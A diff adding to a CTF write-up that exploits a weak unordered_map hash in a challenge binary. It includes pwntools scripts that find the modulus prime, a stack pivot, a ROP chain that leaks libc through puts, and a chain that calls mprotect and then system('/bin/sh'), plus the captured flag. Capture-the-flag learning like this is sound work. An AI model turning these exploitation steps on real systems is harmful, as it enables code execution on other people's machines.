@@ -125,5 +125,99 @@ void fire_neutron() {
 You guessed it, and so did I during the ctf, **the unordered map's hashing has to be a terrible hashing function.**
 A quick google search later, I stumbled onto an [article](https://codeforces.com/blog/entry/62393) on codeforces, which explains all that's needed to solve this challenge.
 What I retained from it is the following :
-- `hash(k) = f(k) mod p` where `f` is some hash function and `p` some prime
-- by default, `f(k)=k`
+- `hash(k) = f(k) mod p` where `f` is some hash function and `p`
+- by default, `f(k)=k` for some types, including `unsigned int`
+- `p` is dependent on the unsorted map size, but is necessarily one of the primes in [`__prime_list`](https://github.com/gcc-mirror/gcc/blob/5bea0e90e58d971cf3e67f784a116d81a20b927a/libstdc%2B%2B-v3/src/shared/hashtable-aux.cc)
+
+### Figuring out `p`
+To figure out `p`, for each `q` in `__prime_list`, we add `32` elements, in `atoms`, such that each key is divisible by `q`, then fire a neuron on one of the `atoms`.
+Note that I limited myself to `q` small enough for its multiples to be in `unsigned int` range !
+For `p==q`, all atoms will be copied in `elems` whereas only one will be otherwise !
+```python
+primes = [...]
+
+def prompt(m):
+    io.sendlineafter(b"> ",m)
+
+def prompti(i):
+    prompt(str(i).encode())
+N = 32
+for p in primes:
+    if (p < (2 ** 32-1)/N):
+        io = start()
+        prompt(b"skuuk")
+        for i in range(N):
+            prompt(b"1")
+            prompt(str(i*p).encode())
+            prompt(str(i).encode())
+        prompt(b"2")
+        prompt(str(p).encode())
+        log.info(io.recvuntil(b"goodbye!\n"))
+        io.close()
+```
+Using this procedure, I found that in our case `p==59` works.
+Now, we can craft `atoms` to oveflow `elems` !
+
+## Caveats
+We are somewhat limited in our ability to ROP because we don't have a big overflow and the elements are arranged depending on the natural sort order of the keys, (and perhaps the order of insertions too). I will spare you the details but I decided to rely on a stack pivot to `username` as a result, and crafted all keys based on the address of `username` to keep the ordering of `elems` fixed. 
+By overflowing, we also set the size of `elems` which determines the number of iterations of the loop in `fire_neuron` so I set it small enough to avoid a very long sequence of prints 😆.
+
+## Exploit
+- This is the stack pivot I used :
+```asm
+pop rsp; pop rbp; ret
+```
+Thus, we need to start our rop chain in `username` by some value that will be popped into `rbp`.
+Here
+- We have a `pop rdi; pop rbp; ret` gadget, thus we can leverage it to leak libc using the `plt` and `got` entries of `puts`, as in a classic ret2libc attack
+- Then we go back to main
+```python
+pop_rdi_rbp = 0x4025e0
+pop_rsp_rbp = 0x404ac7
+ret = 0x40201a
+rop = [0,pop_rdi_rbp, exe.got.puts, 0, exe.plt.puts, exe.sym.main]
+io = start()
+prompt(b"".join([p64(g) for g in rop]))
+good_prime = 59
+offset = 0x409eac
+for i in range(32):
+    prompti(1)
+    if i == 24:
+        prompti(offset + good_prime*i)
+        prompti(2)
+    else:
+        prompti(offset + good_prime*i)
+        prompti(pop_rsp_rbp)
+prompti(2)
+prompti(offset)
+l = io.recvuntil(b"research").split(b"atomic ")[0][-7:-1]
+puts_addr = unpack(l,'all')
+log.info(f"puts : 0x{puts_addr:x}")
+libc = exe.libc
+libc.address = puts_addr - libc.sym.puts
+log.info((f"libc : 0x{libc.address:x}"))
+```
+- Once we go back to main and we provide a name, because of the pivoting, the `stack` still overlaps with `username`. This allows us to rop directly !
+- Note that `system`  writes some data on the stack, and happens to reach a read-only page in our specific case
+- To accomodate for it, I first returned to `mprotect` to set that memory page as `rwx` *(`rw` would have been enough)*
+```C
+pop_rdi = libc.address + 0x2a3e5
+pop_rsi = libc.address + 0xda97d
+pop_rdx_rbx = libc.address + 0x90529
+
+m_addr = 0x409000
+m_len = 0x1000
+prot = 0x7
+rop_mprotect = p64(pop_rdi) + p64(m_addr) + p64(pop_rsi) + p64(m_len) + p64(pop_rdx_rbx) + p64(prot)*2 + p64(libc.sym.mprotect)
+rop2 = rop_mprotect + p64(pop_rdi_rbp) +p64(next(libc.search(b'/bin/sh\x00')))*2 + p64(ret) + p64(libc.sym.system)
+prompt(b"a"*16 +rop2)
+io.interactive()
+```
+## **FLAG**
+```
+DUCTF{wH0_KnEw_Th4T_HAsHm4ps_4nD_nUCle4r_Fi5S10n_HAd_s0meTHiNg_1n_c0MmoN}
+```
+A very good pun for a very cool challenge 👏
+
+
+
